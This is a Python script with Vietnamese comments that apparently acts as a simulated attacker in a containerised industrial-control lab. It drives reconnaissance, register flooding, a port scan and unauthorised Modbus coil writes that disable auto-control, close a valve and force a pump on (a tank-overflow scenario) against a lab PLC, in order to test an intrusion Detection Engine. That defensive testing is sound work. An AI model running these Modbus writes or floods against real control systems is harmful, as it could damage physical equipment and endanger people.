"""Máy tấn công giả lập: sinh các hành vi bất thường để kiểm chứng Detection Engine.

Chạy từ một container có IP lạ trên mạng ics_net, ví dụ:
    docker run --rm --network project3_ics_net --ip 172.28.0.66 ics-lab \
        python attacker.py <mode>

Các mode:
    recon        đọc nhiều địa chỉ không tồn tại  -> luật truy cập thanh ghi bất thường
    write        tắt auto, đóng van, bật bơm       -> luật ghi trái phép (kịch bản tràn bồn)
    dos          bắn dồn dập nhiều request         -> luật tần suất bất thường / DoS
    probe        chỉ kết nối và đọc một lần         -> luật thiết bị lạ + kết nối mới
Mọi mode đều đến từ IP lạ nên đồng thời kích luật "thiết bị lạ" và "kết nối mới".
"""

import asyncio
import os
import sys

from pymodbus.client import AsyncModbusTcpClient

import modbus_map as m

PLC_HOST = os.getenv("PLC_HOST", "172.28.0.10")
PLC_PORT = int(os.getenv("PLC_PORT", "502"))


async def recon(c):
    """Dò la: đọc hàng loạt địa chỉ không tồn tại -> PLC trả exception."""
    for addr in range(100, 130):
        await c.read_holding_registers(addr, count=1, device_id=m.DEVICE_ID)
    print("recon: đã dò 30 địa chỉ holding register không tồn tại")


async def write(c):
    """Kịch bản tràn bồn: vô hiệu hóa điều khiển tự động rồi ép bơm chạy."""
    await c.write_coil(m.COIL_AUTO, False, device_id=m.DEVICE_ID)   # tắt tự động
    await c.write_coil(m.COIL_VALVE, False, device_id=m.DEVICE_ID)  # đóng van xả
    await c.write_coil(m.COIL_PUMP, True, device_id=m.DEVICE_ID)    # ép bơm chạy
    print("write: đã tắt auto, đóng van, bật bơm (kịch bản tràn bồn)")


async def dos(c):
    """Tấn công tần suất: bắn thật nhiều request trong thời gian ngắn."""
    for _ in range(400):
        await c.read_holding_registers(0, count=1, device_id=m.DEVICE_ID)
    print("dos: đã gửi 400 request liên tiếp")


async def probe(c):
    """Chỉ kết nối và đọc một lần — đủ để lộ thiết bị lạ + kết nối mới."""
    await c.read_input_registers(0, count=3, device_id=m.DEVICE_ID)
    print("probe: đã kết nối và đọc một lần")


async def scan(c):
    """Quét cổng: thử kết nối TCP tới nhiều cổng khác nhau trên PLC (sinh SYN)."""
    ports = [21, 22, 23, 25, 80, 102, 443, 502, 1911, 2404, 4840,
             8080, 8443, 20000, 44818, 1234, 5020, 9999]

    async def hit(p):
        try:
            _, w = await asyncio.wait_for(
                asyncio.open_connection(PLC_HOST, p), timeout=0.5)
            w.close()
        except Exception:
            pass

    await asyncio.gather(*(hit(p) for p in ports))
    print(f"scan: đã thử {len(ports)} cổng")


MODES = {"recon": recon, "write": write, "dos": dos, "probe": probe, "scan": scan}


async def main(mode: str) -> None:
    client = AsyncModbusTcpClient(PLC_HOST, port=PLC_PORT)
    await client.connect()
    try:
        await MODES[mode](client)
    finally:
        client.close()


if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "probe"
    if mode not in MODES:
        print(f"mode không hợp lệ. Chọn: {', '.join(MODES)}")
        sys.exit(1)
    asyncio.run(main(mode))
